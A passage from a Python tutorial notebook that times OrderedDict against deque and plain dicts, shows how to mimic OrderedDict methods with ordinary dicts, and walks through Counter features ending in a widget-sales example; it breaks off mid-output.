If you are familiar with stacks and queues, you are probably wondering if the `popitem` method means we can effectively use an `OrderedDict` as such data structures.

Well yes, we can, but the real question is whether it is as efficient as using a `deque` for example.

Let's try it out and do some timings:


```
from timeit import timeit
```


```
from collections import deque
```


```
def create_ordereddict(n=100):
    d = OrderedDict()
    for i in range(n):
        d[str(i)] = i
    return d
```


```
def create_deque(n=100):
    return deque(range(n))   
```

Now let's time how log it takes to pop off the last element of each data structure repeatedely until the structure is empty.

Instead of testing each time if the structure is empty, I'm going to simply pop items until I get an exception - since I only expect one exception and many many more succesful pop attempts, this will be more efficient:

A `deque` will raise an `IndexError` exception if we attempt to pop an item from an empty `deque`. The `OrderedDict` will raise a `KeyError` exception.


```
def pop_all_ordered_dict(n=1000, last=True):
    d = create_ordereddict(n)
    while True:
        try:
            d.popitem(last=last)
        except KeyError:
            # done popping
            break           
```


```
def pop_all_deque(n=1000, last=True):
    dq = create_deque(n)
    if last:
        pop = dq.pop
    else:
        pop = dq.popleft

    while True:
        try:
            pop()
        except IndexError:
            break

```

Now let's go ahead and time these operations, both the creations and the pops:


```
timeit('create_ordereddict(10_000)', 
       globals=globals(), 
       number=1_000)
```




    2.2906384040252306




```
timeit('create_deque(10_000)', 
       globals=globals(), 
       number=1_000)
```




    0.1509137399843894



Now let's time popping elements - keep in mind that we are also timing the recreation of the data structures every time as well - so our timings are going to be biased because of that. A very rough way of rectifying that will be to subtract how much time we measured above for creating the structures by themselves:


```
n = 10_000
number = 1_000

results = dict()

results['dict_create'] = timeit('create_ordereddict(n)', 
                                globals=globals(), 
                                number=number)

results['deque_create'] = timeit('create_deque(n)', 
                                 globals=globals(), 
                                 number=number)

results['dict_create_pop_last'] = timeit(
    'pop_all_ordered_dict(n, last=True)',
    globals=globals(), number=number)

results['dict_create_pop_first'] = timeit(
    'pop_all_ordered_dict(n, last=False)',
    globals=globals(), number=number)

results['deque_create_pop_last'] = timeit(
    'pop_all_deque(n, last=True)',
    globals=globals(), number=number
)

results['deque_create_pop_first'] = timeit(
    'pop_all_deque(n, last=False)',
    globals=globals(), number=number
)

results['dict_pop_last'] = (
    results['dict_create_pop_last'] - results['dict_create'])

results['dict_pop_first'] = (
    results['dict_create_pop_first'] - results['dict_create'])

results['deque_pop_last'] = (
    results['deque_create_pop_last'] - results['deque_create'])

results['deque_pop_first'] = (
    results['deque_create_pop_first'] - results['deque_create'])

for key, result in results.items():
    print(f'{key}: {result}')

```

    dict_create: 2.3447022930486128
    deque_create: 0.15744277997873724
    dict_create_pop_last: 4.827248840010725
    dict_create_pop_first: 4.72704964800505
    deque_create_pop_last: 0.3677212379989214
    deque_create_pop_first: 0.3731844759895466
    dict_pop_last: 2.482546546962112
    dict_pop_first: 2.382347354956437
    deque_pop_last: 0.2102784580201842
    deque_pop_first: 0.2157416960108094
    

As you can see, even though we can certainly use an `OrderedDict` as a stack or queue (and there might be good reasons why we want to use a dictionary for such structures), if you can use a `deque` you will get much faster performance.

One good reason might be if you both need a stack/queue and also need to check for the existence of items frequently - searching a list is very inefficient compared to a dictionary, so depending on your use case the cost of looking up items in a `deque` might be worth the cost of popping/inserting items in an `OrderedDict` instead.

##  OrderedDict vs Python 3.6 Plain Dicts

So, the question, if we are targeting Python 3.6+ is whether we lose anything by not using an `OrderedDict` since plain `dicts` now preserve key order.

As we saw in the previous video there were a few features that `OrderedDicts` offer that `dicts` do not have:

* reverse iteration
* pop first/last item
* move key to beginning/end of dictionary
* equality (`==`) that takes key order into account

We can actually achieve of these things using plain dictionaries, it's just not as straightforward as using the OrdertedDict methods - although I would not be surprised if Python dictionaries eventually get this functionality now that they have a guaranteed key order preservation.


```
from collections import OrderedDict
```

#### Reverse Iteration


```
d1 = OrderedDict(a=1, b=2, c=3, d=4)
d2 = dict(a=1, b=2, c=3, d=4)
```


```
print(d1)
print(d2)
```

    OrderedDict([('a', 1), ('b', 2), ('c', 3), ('d', 4)])
    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    


```
for k in reversed(d1):
    print(k)
```

    d
    c
    b
    a
    

This will not work with a plain dictionary, and neither will it work with the views.

But, it looks like this will get implemented in Python 3.8 - https://bugs.python.org/issue33462

For now, it can be done but it means making a list out of the keys, and then iterating through the reversed list:


```
for k in reversed(list(d2.keys())):
    print(k)
```

    d
    c
    b
    a
    

This is of course not iteal since we have to make a copy of all the keys into a list first - not very efficient. So, we should probably wait for Python 3.8 :-)

#### Popping Items

Next let's look at `popitem` - we need to be able to pop either the first or the last element.

To do this, we really need to be able to determine the *first* and *last* key in the dictionary - again, this is not something we currently have natively in plain dictionaries, so we need to calculate them ourselves.

Getting the first key is not difficult - we simply retrieve the first key from the keys() view for example:


```
first_key = next(iter(d2.keys()))
print(d2)
print(first_key)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    a
    

Fiding the last key is a bit more challenging, but fortunately, we can just use the `popitem` method on plain dictionaries that is guaranteed to pop the last insert item - again, this is a guarantee only in Python 3.7 and above:


```
d1 = OrderedDict(a=1, b=2, c=3, d=4)
d2 = dict(a=1, b=2, c=3, d=4)

print(d2)
print(d2.popitem())
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    ('d', 4)
    {'a': 1, 'b': 2, 'c': 3}
    

So we could combine these into a custom function as follows:


```
def popitem(d, last=True):
    if last:
        return d.popitem()
    else:
        first_key = next(iter(d.keys()))
        return first_key, d.pop(first_key)
```


```
d2 = dict(a=1, b=2, c=3, d=4)
print(d2)
print(popitem(d2))
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    ('d', 4)
    {'a': 1, 'b': 2, 'c': 3}
    


```
d2 = dict(a=1, b=2, c=3, d=4)
print(d2)
print(popitem(d2, last=False))
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    ('a', 1)
    {'b': 2, 'c': 3, 'd': 4}
    

#### Move to End

Next let's look at the `move_to_end` method, which can move any key to either the beginning or the end of the dictionary.

Moving a key to the end of the dictionary is easy - we simply pop the item, and insert it again - because of the gauranteed insertion order, this means the key will now be placed at the end of the dictionary:


```
d2 = dict(a=1, b=2, c=3, d=4)
print(d2)
key = 'b'
d2[key] = d2.pop(key)
print(d2)
```

    {'a': 1, 'b': 2, 'c': 3, 'd': 4}
    {'a': 1, 'c': 3, 'd': 4, 'b': 2}
    

Moving to the beginning however is not as easy - the only way I could think of was to take the desired key and moving it to the end first. Then, take every key preceding it, and pop them off and add them back to the dictionary one by one, until, but not including the target key we wanted to move to the beginning of the dictionary.

In other words something like this:

```a b c d e f```

To move `c` to the front, first pop it and add it to the dictionary:
``` a b d e f c```

Now we do the same thing to every key preceding `c`, essentially moving each key one by one to the end of the dictionary:

```b d e f c a```

```d e f c a b```

```e f c a b d```

```f c a b d e```

```c a b d e f```

We can code it this way:


```
d = dict(a=1, b=2, c=3, d=4, e=5, f=6)
key = 'c'

print(d.keys())

# first move desired key to end
d[key] = d.pop(key)  
print(d.keys())

keys = list(d.keys())[:-1]
for key in keys:
    d[key] = d.pop(key)
    print(d.keys())
    
print(d)
```

    dict_keys(['a', 'b', 'c', 'd', 'e', 'f'])
    dict_keys(['a', 'b', 'd', 'e', 'f', 'c'])
    dict_keys(['b', 'd', 'e', 'f', 'c', 'a'])
    dict_keys(['d', 'e', 'f', 'c', 'a', 'b'])
    dict_keys(['e', 'f', 'c', 'a', 'b', 'd'])
    dict_keys(['f', 'c', 'a', 'b', 'd', 'e'])
    dict_keys(['c', 'a', 'b', 'd', 'e', 'f'])
    {'c': 3, 'a': 1, 'b': 2, 'd': 4, 'e': 5, 'f': 6}
    

We can combine both into a single function:


```
def move_to_end(d, key, *, last=True):
    d[key] = d.pop(key)
    
    if not last:
        for key in list(d.keys())[:-1]:
            d[key] = d.pop(key)       
```


```
d = dict(a=1, b=2, c=3, d=4, e=5, f=6)
```


```
move_to_end(d, 'c')
print(d)
```

    {'a': 1, 'b': 2, 'd': 4, 'e': 5, 'f': 6, 'c': 3}
    


```
move_to_end(d, 'c', last=False)
print(d)
```

    {'c': 2, 'a': 1, 'b': 2, 'd': 3, 'e': 4, 'f': 5}
    

#### Equality Comparison

Lastly let's look at equality (`==`) comparisons.
Even though Python 3.6+ guarantees key ordering based on the insertion order, two dictionaries with the same key/values but in different order will compare equal, but not so with `OrderedDict`.

To achieve the same type of "key-order-sensitive" comparison we therefore need to make sure of two things:
1. the dictionaries are equal - i.e. have the same key/value pairs
2. the order of the keys is the same in both dictionaries

We can easily achieve this comparing the dictionaries and the `keys()` views to make sure they are equal:


```
d1 = {'a': 10, 'b': 20, 'c': 30}
d2 = {'b': 20, 'c': 30, 'a': 10}
```


```
d1 == d2
```




    True



Now just comparing the `keys()` views will not work:


```
d1.keys() == d2.keys()
```




    True



Remember that the `keys()` view behaves like a `set`, so comparisons will be `True` as long as the same elements (keys) are present in both sets - but ordering does not matter.

Instead, we can materialize these views as lists, and then compare the lists:


```
list(d1.keys()) == list(d2.keys())
```




    False



So to test for "key-order-sensitive" equality, we can simply do this:


```
d1 == d2 and list(d1.keys()) == list(d2.keys())
```




    False



Of course, materializing the lists incurs some overhead, so instead we could use iteration through both key views and make sure each corresponding key is equal.

There are a number of ways to do this, here I'm going to use `zip` to do it:


```
def dict_equal_sensitive(d1, d2):
    if d1 == d2:
        for k1, k2 in zip(d1.keys(), d2.keys()):
            if k1 != k2:
                return False
        return True
    else:
        return False
```


```
dict_equal_sensitive(d1, d2)
```




    False




```
dict_equal_sensitive(d1, d1)
```




    True



If you want a pure functional programming approach that does not use a loop, we can do it this way too, using `all` and `map`:


```
def dict_equal_sensitive(d1, d2):
    if d1 == d2:
        return all(map(lambda el: el[0] == el[1], 
                       zip(d1.keys(), d2.keys())
                      )
                  )
    else:
        return False
```


```
dict_equal_sensitive(d1, d2)
```




    False




```
dict_equal_sensitive(d1, d1)
```




    True



So, we can perform all these operations on a standard dictionary, but it is a lot more work to do so - for now I would stick to using an `OrderedDict` when I need those specific methods beyond just a guaranteed key order. If the guaranteed key order is all I need, then a plain `dict` will work just fine.

#### Timings

What about timings?

Let's look at a few timings to see the performance difference between plain `dicts` and `OrderedDicts`.


```
from timeit import timeit
```


```
def create_dict(n=100):
    d = dict()
    for i in range(n):
        d[i] = i
    return d
```


```
def create_ordered_dict(n=100):
    d = OrderedDict()
    for i in range(n):
        d[i] = i
    return d
```


```
timeit('create_dict(10_000)', globals=globals(), number=1_000)
```




    0.46366495298570953




```
timeit('create_ordered_dict(10_000)', globals=globals(), number=1_000)
```




    0.718640872015385



As you can see, creating an OrderedDict has slightly more overhead.

Let's see if recovering a key from an `OrderedDict` is slower than a plain `dict`:


```
d1 = create_dict(10_000)
d2 = create_ordered_dict(10_000)

timeit('d1[9_999]', globals=globals(), number=100_000)
```




    0.005689098994480446




```
timeit('d2[9_999]', globals=globals(), number=100_000)
```




    0.005895093985600397



So no significant difference between these two.


Let's see how pop (first and last) differs:


```
n = 1_000_000
d1 = create_dict(n)
timeit('d1.popitem()', globals = globals(), number=n)
```




    0.06503099398105405




```
n = 1_000_000
d2 = create_ordered_dict(n)
timeit('d2.popitem(last=True)', globals = globals(), number=n)
```




    0.26186515000881627



Perhaps not surprisingly, the built-in `dict` is substantially faster at popping the last item of the dictionary.

What about popping the first item?


```
n = 100_000
d1 = create_dict(n)
timeit('popitem(d1, last=False)', globals = globals(), number=n)
```




    2.9098294480063487




```
n = 100_000
d2 = create_ordered_dict(n)
timeit('d2.popitem(last=False)', globals = globals(), number=n)
```




    0.038049360999139026



As you can see, substantially faster in an `OrderedDict`.

You can try the other methods (`move_to_end` and equality testing) yourself - if you do, please post your results in the **Q&A** section!
Or maybe you can come up with more efficient alternatives to what we have here for pop, move, etc.

##  Counter

The `Counter` dictionary is one that specializes for helping with, you guessed it, counters!

Actually we used a `defaultdict` earlier to do something similar:


```
from collections import defaultdict, Counter
```

Let's say we want to count the frequency of each character in a string:


```
sentence = 'the quick brown fox jumps over the lazy dog'
```


```
counter = defaultdict(int)
```


```
for c in sentence:
    counter[c] += 1
```


```
counter
```




    defaultdict(int,
                {'t': 2,
                 'h': 2,
                 'e': 3,
                 ' ': 8,
                 'q': 1,
                 'u': 2,
                 'i': 1,
                 'c': 1,
                 'k': 1,
                 'b': 1,
                 'r': 2,
                 'o': 4,
                 'w': 1,
                 'n': 1,
                 'f': 1,
                 'x': 1,
                 'j': 1,
                 'm': 1,
                 'p': 1,
                 's': 1,
                 'v': 1,
                 'l': 1,
                 'a': 1,
                 'z': 1,
                 'y': 1,
                 'd': 1,
                 'g': 1})



We can do the same thing using a `Counter` - unlike the `defaultdict` we don't specify a default factory - it's always zero (it's a counter after all):


```
counter = Counter()
for c in sentence:
    counter[c] += 1
```


```
counter
```




    Counter({'t': 2,
             'h': 2,
             'e': 3,
             ' ': 8,
             'q': 1,
             'u': 2,
             'i': 1,
             'c': 1,
             'k': 1,
             'b': 1,
             'r': 2,
             'o': 4,
             'w': 1,
             'n': 1,
             'f': 1,
             'x': 1,
             'j': 1,
             'm': 1,
             'p': 1,
             's': 1,
             'v': 1,
             'l': 1,
             'a': 1,
             'z': 1,
             'y': 1,
             'd': 1,
             'g': 1})



OK, so if that's all there was to `Counter` it would be pretty odd to have a data structure different than `OrderedDict`.

But `Counter` has a slew of additional methods which make sense in the context of counters:

1. Iterate through all the elements of counters, but repeat the elements as many times as their frequency
2. Find the `n` most common (by frequency) elements
3. Decrement the counters based on another `Counter` (or iterable)
4. Increment the counters based on another `Counter` (or iterable)
5. Specialized constructor for additional flexibility

If you are familiar with multisets, then this is essentially a data structure that can be used for multisets.

#### Constructor

It is so common to create a frequency distribution of elements in an iterable, that this is supported automatically:


```
c1 = Counter('able was I ere I saw elba')
c1
```




    Counter({'a': 4,
             'b': 2,
             'l': 2,
             'e': 4,
             ' ': 6,
             'w': 2,
             's': 2,
             'I': 2,
             'r': 1})



Of course this works for iterables in general, not just strings:


```
import random
```


```
random.seed(0)
```


```
my_list = [random.randint(0, 10) for _ in range(1_000)]
```


```
c2 = Counter(my_list)
```


```
c2
```




    Counter({6: 95,
             0: 97,
             4: 91,
             8: 76,
             7: 94,
             5: 89,
             9: 85,
             3: 80,
             2: 88,
             1: 107,
             10: 98})



We can also initialize a `Counter` object by passing in keyword arguments, or even a dictionary:


```
c2 = Counter(a=1, b=10)
c2
```




    Counter({'a': 1, 'b': 10})




```
c3 = Counter({'a': 1, 'b': 10})
c3
```




    Counter({'a': 1, 'b': 10})



Technically we can store values other than integers in a `Counter` object - it's possible but of limited use since the default is still `0` irrespective of what other values are contained in the object.

#### Finding the n most Common Elements

Let's find the `n` most common words (by frequency) in a paragraph of text. Words are considered delimited by white space or punctuation marks such as `.`, `,`, `!`, etc - basically anything except a character or a digit.
This is actually quite difficult to do, so we'll use a close enough approximation that will cover most cases just fine, using a regular expression:


```
import re
```


```
sentence = '''
his module implements pseudo-random number generators for various distributions.

For integers, there is uniform selection from a range. For sequences, there is uniform selection of a random element, a function to generate a random permutation of a list in-place, and a function for random sampling without replacement.

On the real line, there are functions to compute uniform, normal (Gaussian), lognormal, negative exponential, gamma, and beta distributions. For generating distributions of angles, the von Mises distribution is available.

Almost all module functions depend on the basic function random(), which generates a random float uniformly in the semi-open range [0.0, 1.0). Python uses the Mersenne Twister as the core generator. It produces 53-bit precision floats and has a period of 2**19937-1. The underlying implementation in C is both fast and threadsafe. The Mersenne Twister is one of the most extensively tested random number generators in existence. However, being completely deterministic, it is not suitable for all purposes, and is completely unsuitable for cryptographic purposes.'''
```


```
words = re.split('\W', sentence)
```


```
words
```




    ['',
     'his',
     'module',
     'implements',
     'pseudo',
     'random',
     'number',
     'generators',
     'for',
     'various',
     'distributions',
     '',
     '',
     'For',
     'integers',
     '',
     'there',
     'is',
     'uniform',
     'selection',
     'from',
     'a',
     'range',
     '',
     'For',
     'sequences',
     '',
     'there',
     'is',
     'uniform',
     'selection',
     'of',
     'a',
     'random',
     'element',
     '',
     'a',
     'function',
     'to',
     'generate',
     'a',
     'random',
     'permutation',
     'of',
     'a',
     'list',
     'in',
     'place',
     '',
     'and',
     'a',
     'function',
     'for',
     'random',
     'sampling',
     'without',
     'replacement',
     '',
     '',
     'On',
     'the',
     'real',
     'line',
     '',
     'there',
     'are',
     'functions',
     'to',
     'compute',
     'uniform',
     '',
     'normal',
     '',
     'Gaussian',
     '',
     '',
     'lognormal',
     '',
     'negative',
     'exponential',
     '',
     'gamma',
     '',
     'and',
     'beta',
     'distributions',
     '',
     'For',
     'generating',
     'distributions',
     'of',
     'angles',
     '',
     'the',
     'von',
     'Mises',
     'distribution',
     'is',
     'available',
     '',
     '',
     'Almost',
     'all',
     'module',
     'functions',
     'depend',
     'on',
     'the',
     'basic',
     'function',
     'random',
     '',
     '',
     '',
     'which',
     'generates',
     'a',
     'random',
     'float',
     'uniformly',
     'in',
     'the',
     'semi',
     'open',
     'range',
     '',
     '0',
     '0',
     '',
     '1',
     '0',
     '',
     '',
     'Python',
     'uses',
     'the',
     'Mersenne',
     'Twister',
     'as',
     'the',
     'core',
     'generator',
     '',
     'It',
     'produces',
     '53',
     'bit',
     'precision',
     'floats',
     'and',
     'has',
     'a',
     'period',
     'of',
     '2',
     '',
     '19937',
     '1',
     '',
     'The',
     'underlying',
     'implementation',
     'in',
     'C',
     'is',
     'both',
     'fast',
     'and',
     'threadsafe',
     '',
     'The',
     'Mersenne',
     'Twister',
     'is',
     'one',
     'of',
     'the',
     'most',
     'extensively',
     'tested',
     'random',
     'number',
     'generators',
     'in',
     'existence',
     '',
     'However',
     '',
     'being',
     'completely',
     'deterministic',
     '',
     'it',
     'is',
     'not',
     'suitable',
     'for',
     'all',
     'purposes',
     '',
     'and',
     'is',
     'completely',
     'unsuitable',
     'for',
     'cryptographic',
     'purposes',
     '']



But what are the frequencies of each word, and what are the 5 most frequent words?


```
word_count = Counter(words)
```


```
word_count
```




    Counter({'': 38,
             'his': 1,
             'module': 2,
             'implements': 1,
             'pseudo': 1,
             'random': 7,
             'number': 2,
             'generators': 2,
             'for': 4,
             'various': 1,
             'distributions': 3,
             'For': 3,
             'integers': 1,
             'there': 3,
             'is': 7,
             'uniform': 3,
             'selection': 2,
             'from': 1,
             'a': 8,
             'range': 2,
             'sequences': 1,
             'of': 5,
             'element': 1,
             'function': 3,
             'to': 2,
             'generate': 1,
             'permutation': 1,
             'list': 1,
             'in': 4,
             'place': 1,
             'and': 5,
             'sampling': 1,
             'without': 1,
             'replacement': 1,
             'On': 1,
             'the': 7,
             'real': 1,
             'line': 1,
             'are': 1,
             'functions': 2,
             'compute': 1,
             'normal': 1,
             'Gaussian': 1,
             'lognormal': 1,
             'negative': 1,
             'exponential': 1,
             'gamma': 1,
             'beta': 1,
             'generating': 1,
             'angles': 1,
             'von': 1,
             'Mises': 1,
             'distribution': 1,
             'available': 1,
             'Almost': 1,
             'all': 2,
             'depend': 1,
             'on': 1,
             'basic': 1,
             'which': 1,
             'generates': 1,
             'float': 1,
             'uniformly': 1,
             'semi': 1,
             'open': 1,
             '0': 3,
             '1': 2,
             'Python': 1,
             'uses': 1,
             'Mersenne': 2,
             'Twister': 2,
             'as': 1,
             'core': 1,
             'generator': 1,
             'It': 1,
             'produces': 1,
             '53': 1,
             'bit': 1,
             'precision': 1,
             'floats': 1,
             'has': 1,
             'period': 1,
             '2': 1,
             '19937': 1,
             'The': 2,
             'underlying': 1,
             'implementation': 1,
             'C': 1,
             'both': 1,
             'fast': 1,
             'threadsafe': 1,
             'one': 1,
             'most': 1,
             'extensively': 1,
             'tested': 1,
             'existence': 1,
             'However': 1,
             'being': 1,
             'completely': 2,
             'deterministic': 1,
             'it': 1,
             'not': 1,
             'suitable': 1,
             'purposes': 2,
             'unsuitable': 1,
             'cryptographic': 1})




```
word_count.most_common(5)
```




    [('', 38), ('a', 8), ('random', 7), ('is', 7), ('the', 7)]



#### Using Repeated Iteration


```
c1 = Counter('abba')
c1
```




    Counter({'a': 2, 'b': 2})




```
for c in c1:
    print(c)
```

    a
    b
    

However, we can have an iteration that repeats the counter keys as many times as the indicated frequency:


```
for c in c1.elements():
    print(c)
```

    a
    a
    b
    b
    

What's interesting about this functionality is that we can turn this around and use it as a way to create an iterable that has repeating elements.

Suppose we want to to iterate through a list of (integer) numbers that are each repeated as many times as the number itself.

For example 1 should repeat once, 2 should repeat twice, and so on.

This is actually not that easy to do!

Here's one possible way to do it:


```
l = []
for i in range(1, 11):
    for _ in range(i):
        l.append(i)
print(l)
```

    [1, 2, 2, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 5, 6, 6, 6, 6, 6, 6, 7, 7, 7, 7, 7, 7, 7, 8, 8, 8, 8, 8, 8, 8, 8, 9, 9, 9, 9, 9, 9, 9, 9, 9, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10]
    

But we could use a `Counter` object as well:


```
c1 = Counter()
for i in range(1, 11):
    c1[i] = i
```


```
c1
```




    Counter({1: 1, 2: 2, 3: 3, 4: 4, 5: 5, 6: 6, 7: 7, 8: 8, 9: 9, 10: 10})




```
print(c1.elements())
```

    <itertools.chain object at 0x1047aa518>
    

So you'll notice that we have a `chain` object here. That's one big advantage to using the `Counter` object - the repeated iterable does not actually exist as list like our previous implementation - this is a lazy iterable, so this is far more memory efficient.

And we can iterate through that `chain` quite easily:


```
for i in c1.elements():
    print(i, end=', ')
```

    1, 2, 2, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 5, 6, 6, 6, 6, 6, 6, 7, 7, 7, 7, 7, 7, 7, 8, 8, 8, 8, 8, 8, 8, 8, 9, 9, 9, 9, 9, 9, 9, 9, 9, 10, 10, 10, 10, 10, 10, 10, 10, 10, 10, 

Just for fun, how could we reproduce this functionality using a plain dictionary?


```
class RepeatIterable:
    def __init__(self, **kwargs):
        self.d = kwargs
        
    def __setitem__(self, key, value):
        self.d[key] = value
        
    def __getitem__(self, key):
        self.d[key] = self.d.get(key, 0)
        return self.d[key]
```


```
r = RepeatIterable(x=10, y=20)
```


```
r.d
```




    {'x': 10, 'y': 20}




```
r['a'] = 100
```


```
r['a']
```




    100




```
r['b']
```




    0




```
r.d
```




    {'x': 10, 'y': 20, 'a': 100, 'b': 0}



Now we have to implement that `elements` iterator:


```
class RepeatIterable:
    def __init__(self, **kwargs):
        self.d = kwargs
        
    def __setitem__(self, key, value):
        self.d[key] = value
        
    def __getitem__(self, key):
        self.d[key] = self.d.get(key, 0)
        return self.d[key]
    
    def elements(self):
        for k, frequency in self.d.items():
            for i in range(frequency):
                yield k
```


```
r = RepeatIterable(a=2, b=3, c=1)
```


```
for e in r.elements():
    print(e, end=', ')
```

    a, a, b, b, b, c, 

#### Updating from another Iterable or Counter

Lastly let's see how we can update a `Counter` object using another `Counter` object. 

When both objects have the same key, we have a choice - do we add the count of one to the count of the other, or do we subtract them?

We can do either, by using the `update` (additive) or `subtract` methods.


```
c1 = Counter(a=1, b=2, c=3)
c2 = Counter(b=1, c=2, d=3)

c1.update(c2)
print(c1)
```

    Counter({'c': 5, 'b': 3, 'd': 3, 'a': 1})
    

On the other hand we can subtract instead of add counters:


```
c1 = Counter(a=1, b=2, c=3)
c2 = Counter(b=1, c=2, d=3)

c1.subtract(c2)
print(c1)
```

    Counter({'a': 1, 'b': 1, 'c': 1, 'd': -3})
    

Notice the key `d` - since `Counters` default missing keys to `0`, when `d: 3` in `c2` was subtracted from `c1`, the counter for `d` was defaulted to `0`.

Just as the constructor for a `Counter` can take different arguments, so too can the `update` and `subtract` methods.


```
c1 = Counter('aabbccddee')
print(c1)
c1.update('abcdef')
print(c1)
```

    Counter({'a': 2, 'b': 2, 'c': 2, 'd': 2, 'e': 2})
    Counter({'a': 3, 'b': 3, 'c': 3, 'd': 3, 'e': 3, 'f': 1})
    

#### Mathematical Operations

These `Counter` objects also support several other mathematical operations when both operands are `Counter` objects. In all these cases the result is a new `Counter` object.

* `+`: same as `update`, but returns a new `Counter` object instead of an in-place update.
* `-`: subtracts one counter from another, but discards zero and negative values
* `&`: keeps the **minimum** of the key values
* `|`: keeps the **maximum** of the key values


```
c1 = Counter('aabbcc')
c2 = Counter('abc')
c1 + c2
```




    Counter({'a': 3, 'b': 3, 'c': 3})




```
c1 - c2
```




    Counter({'a': 1, 'b': 1, 'c': 1})




```
c1 = Counter(a=5, b=1)
c2 = Counter(a=1, b=10)

c1 & c2
```




    Counter({'a': 1, 'b': 1})




```
c1 | c2
```




    Counter({'a': 5, 'b': 10})



The **unary** `+` can also be used to remove any non-positive count from the Counter:


```
c1 = Counter(a=10, b=-10)
+c1
```




    Counter({'a': 10})



The **unary** `-` changes the sign of each counter, and removes any non-positive result:


```
-c1
```




    Counter({'b': 10})



##### Example

Let's assume you are working for a company that produces different kinds of widgets.
You are asked to identify the top 3 best selling widgets.

You have two separate data sources - one data source can give you a history of all widget orders (widget name, quantity), while another data source can give you a history of widget refunds (widget name, quantity refunded).

From these two data sources, you need to determine the top selling widgets (taking refinds into account of course).

Let's simulate both of these lists:


```
import random
random.seed(0)

widgets = ['battery', 'charger', 'cable', 'case', 'keyboard', 'mouse']

orders = [(random.choice(widgets), random.randint(1, 5)) for _ in range(100)]
refunds = [(random.choice(widgets), random.randint(1, 3)) for _ in range(20)]
```


```
orders
```




    [('case', 4),
     ('battery', 3),
     ('keyboard', 4),
     ('case', 3),
     ('case', 3),
     ('keyboard', 2),
     ('keyboard', 2),
     ('cable', 2),
     ('battery', 5),
     ('cable', 5),
     ('mouse', 5),
     ('charger', 3),
     ('battery', 1),
     ('mouse', 3),
     ('case', 5),
     ('battery', 3),
     ('case', 3),
     ('keyboard', 2),
     ('keyboard', 4),
     ('case', 5),
     ('cable', 1),
     ('keyboard', 1),
     ('battery', 4),
     ('mouse', 1),
     ('keyboard', 4),
     ('cable', 2),
     ('mouse', 3),
     ('mouse', 1),
     ('charger', 5),
     ('charger', 2),
     ('charger', 5),
     ('case', 1),
     ('battery', 3),
     ('keyboard', 4),
     ('battery', 3),
     ('keyboard', 3),
     ('mouse', 1),
     ('keyboard', 3),
     ('keyboard', 2),
     ('keyboard', 5),
     ('keyboard', 3),
     ('case', 1),
     ('keyboard', 4),
     ('cable', 5),
     ('charger', 3),
     ('charger', 2),
     ('charger', 1),
     ('keyboard', 3),
     ('case', 1),
     ('battery', 2),
     ('charger', 1),
     ('battery', 5),
     ('mouse', 4),
     ('mouse', 5),
     ('cable', 5),
     ('charger', 2),
     ('mouse', 5),
     ('case', 5),
     ('cable', 4),
     ('case', 3),
     ('battery', 3),
     ('keyboard', 1),
     ('case', 5),
     ('mouse', 3),
     ('charger', 2),
     ('battery', 3),
     ('battery', 2),
     ('cable', 2),
     ('cable', 4),
     ('battery', 1),
     ('charger', 2),
     ('battery', 5),
     ('mouse', 5),
     ('keyboard', 1),
     ('battery', 1),
     ('mouse', 2),
     ('keyboard', 5),
     ('battery', 4),
     ('battery', 3),
     ('battery', 1),
     ('keyboard', 1),
     ('charger', 2),
     ('mouse', 1),
     ('case', 2),
     ('mouse', 1),
     ('mouse', 1),
     ('keyboard', 4),
     ('keyboard', 1),
     ('cable', 1),
     ('charger', 1),
     ('mouse', 3),
     ('cable', 4),
     ('charger', 1),
     ('keyboard', 4),
     ('battery', 5),
     ('battery', 4),
     ('charger', 3),
     ('cable', 4),
     ('keyboard', 2),
     ('mouse', 2)]




```
refunds
```




    [('battery', 3),
     ('charger', 1),
     ('cable', 3),
     ('cable', 1),
     ('keyboard', 2),
     ('mouse', 1),
     ('battery', 2),
     ('mouse', 2),
     ('keyboard', 3),
     ('cable', 3),
     ('cable', 2),
     ('mouse', 2),
     ('charger', 3),
     ('mouse', 1),
     ('case', 3),
     ('battery', 2),
     ('mouse', 1),
     ('keyboard', 2),
     ('charger', 1),
     ('case', 2)]



Let's first load these up into counter objects.

To do this we're going to iterate through the various lists and update our counters:


```
sold_counter = Counter()
refund_counter = Counter()

for order in orders:
    sold_counter[order[0]] += order[1]

for refund in refunds:
    refund_counter[refund[0]] += refund[1]
```


```
sold_counter
```




    Counter({'case': 41,
             'battery': 61,
             'keyboard': 65,
             'cable': 39,
             'mouse': 46,
             'charger': 35})




```
refund_counter
```




    Counter({'battery': 7,
             'charger': 5,
             'cable': 9,
             'keyboard': 7,
             'mouse': 7,
             'case': 5})




```
net_counter = sold_counter - refund_counter
```


```
net_counter
```




    Counter({'case': 36,
             'battery': 54,
             'keyboard': 58,
             'cable': 30,
             'mouse': 39,
             'charger': 30})




```
net_counter.most_common(3)
```




    [('keyboard', 58), ('battery', 54), ('mouse', 39)]



We could actually do this a little differently, not using loops to populate our initial counters.

Recall the `repeat()` function in `itertools`:


```
from itertools import repeat
```


```
list(repeat('battery', 5))
```




    ['battery', 'battery', 'battery', 'battery', 'battery']




```
orders[0]
```




    ('case', 4)




```
list(repeat(*orders[0]))
```




    ['case', 'case', 'case', 'case']



So we could use the `repeat()` method to essentially repeat each widget for each item of `orders`. We need to chain this up for each element of `orders` - this will give us a single iterable that we can then use in the constructor for a `Counter` object. We can do this using a generator expression for example:


```
from itertools import chain
```


```
list(chain.from_iterable(repeat(*order) for order in orders))
```




    ['case',
     'case',
     'case',
     'case',
     'battery',
     'battery',
     'battery',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'case',
     'case',
     'case',
     'case',
     'case',
     'case',
     'keyboard',
     'keyboard',
     'keyboard',
     'keyboard',
     'cable',
     'cable',
     'battery',
     'battery',
     'battery',
     'battery',
     'battery',
     'cable',
     'cable',
     'cable',
     'cable',
     'cable',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'mouse',
     'charger',
     'charger',
     'charger',
     'battery',
     'mouse',
     'mouse',
     'mouse',
     'case',
     'case',
     'case',
     'case',
     'case',
     'battery',
